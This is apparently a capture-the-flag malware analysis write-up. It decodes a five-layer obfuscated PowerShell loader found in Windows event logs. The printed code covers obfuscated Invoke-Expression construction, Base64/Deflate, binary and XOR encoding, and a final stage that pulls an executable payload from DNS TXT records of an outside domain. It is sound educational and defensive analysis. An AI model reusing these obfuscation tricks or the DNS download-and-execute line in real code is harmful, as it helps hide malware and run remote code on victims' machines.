# 📝 Malware Analysis Write-Up — Multi-Stage PowerShell Loader

## 📂 Overview

In this challenge we were given **five Windows Event Log (.evtx)** files:

* Application
* Operational
* Security
* Setup
* System

While inspecting the **Operational** log in Event Viewer, a suspicious PowerShell command executed by a user immediately stood out. After extracting the command and formatting it in VS Code, the structure of the malware became clear.

---

# 🔥 Stage 1 — Initial Loader (Base64 + Deflate + Hidden IEX)

The malicious command:

```powershell
.( $VErboSEPREfErenCe.toSTRING()[1,3]+'x'-jOIN'') (
    NeW-OBjeCT io.sTrEAMREaDeR(
        (NeW-OBjeCT SYsTEM.io.cOmpRessIOn.dEfLaTeSTreAM(
            [SysTem.io.mEmoRYStrEaM] [sySteM.conveRt]::fROmbaSe64sTriNg(
                '7V1NiyTJ ... 7ennXz/939f/+PUvf/NP'
            ),
            [sYstEM.iO.coMpRESsIon.cOmPrESsIoNmodE]::dEcOMpresS
        )),
        [SYsTEM.TeXt.EnCODiNG]::asciI
    )
).rEadtOEND()
```

### ✔ What happens here

* `$VerbosePreference` normally contains the string: **SilentlyContinue**
* Characters `[1,3]` are **"i"** and **"e"**
* `"i" + "e" + "x"` = **iex**

So the malware constructs `iex` (Invoke-Expression) without writing it explicitly.

The rest:

* Decodes Base64
* Wraps bytes in a `MemoryStream`
* Decompresses via **DeflateStream**
* Reads the resulting script

This yields **Stage 2**.

### 🔐 Safety

Remove the constructed `iex` call to decode safely.

---

# 🔥 Stage 2 — Binary-Encoded Script

Decoded Stage 1 results in something like:

```powershell
-join ($("00100110 00100000 00101000 00100000 00100100 01010011 01101000"
-split ' ') | ForEach-Object { [char][Convert]::ToInt32($_, 2) }) | IEX
```

### ✔ What this does

* Contains hundreds of **8-bit binary values**
* Splits them into an array
* Converts each binary number → decimal → char
* Joins all chars into a script
* Executes it using `IEX`

### 🔐 Safety

Remove `| IEX` to inspect safely.

---

# 🔥 Stage 3 — XOR-Obfuscated Integers

Decoded Stage 2 yields:

```powershell
& ( $SheLLiD[1]+$ShELlID[13]+'X') (
    [STrIng]::JOIn('' , (
        (116,116,39,17,1,89,94) |
        % { [CHaR]($_ -BXor 0x54) }
    ))
)
```

### ✔ Meaning

* `$ShellId[1] + $ShellId[13] + 'X'` → **iex**
* The payload is encoded as integers
* Decoded by: `character = integer XOR 0x54`

This yields **Stage 4**.

---

# 🔥 Stage 4 — Heavy String Manipulation Obfuscation

Stage 4 looks like:

```powershell
sET-ITeM('VARiABl'+'E:rC'+'w')([TypE]("{0}{1}"-f 'sT','ring'));
("{120}{83}{22}{31}{10}{42}{21}{93}{95}{40}{9}{37}{30}{68} ... }
| &('%') { ... }
| .("{0}{5}{1}{2}{3}{4}"-f 'i','K','E-','eXpR','essION','nVO')
```

### ✔ What happens

* A temporary variable is created (`variable:rcw`)
* Thousands of characters are reassembled through:

  * split
  * join
  * substring
  * array slicing
* Final line again resolves to **Invoke-Expression**, built via string formatting:

```
"{0}{5}{1}{2}{3}{4}" → i + nVO + K + E- + eXpR + ession = Invoke-Expression
```

### 🔐 Safety

Remove that last obfuscated IEX.

This yields **Stage 5**.

---

# 🔥 Stage 5 — DNS-Based C2 Retrieval

Final stage:

```powershell
# IEX [System.Text.Encoding]::UTF8.GetString(
[System.Convert]::FromBase64String(
    (
        (
            (nslookup -querytype=txt "chronos-security.ro" | Select-String '"*"') | Sort-Object
        )[3] -replace '^[^"]*"|"$'
    )
    + ('==','=','','=')[((
            (nslookup -querytype=txt "chronos-security.ro" | Select-String '"*"') | Sort-Object
        )[3] -replace '^[^"]*"|"$'
    ).Length % 4]
)))
```

### ✔ What this does

* Performs a DNS TXT lookup to: **chronos-security.ro**
* Extracts Base64 from the TXT record
* Applies correct Base64 padding
* Decodes the final payload

This is a **DNS C2 mechanism**: malware retrieves payloads using DNS instead of HTTP.

### 🔐 Final step

Remove `IEX` and decode → the **flag** is revealed.

---

# 🏁 Summary

The malware uses **five layers of obfuscation**:

1. Obfuscated IEX + Base64 + Deflate decompression
2. Binary → char reconstruction
3. XOR-decoded integer array
4. Extreme string-manipulation obfuscation
5. DNS TXT extraction for final payload delivery

At every step, the attacker attempts to hide:

* Invocation of `iex`
* Payload strings
* Final network communication

By manually removing the execution components and decoding each stage, the full chain can be reconstructed and the final payload/flag is recovered.


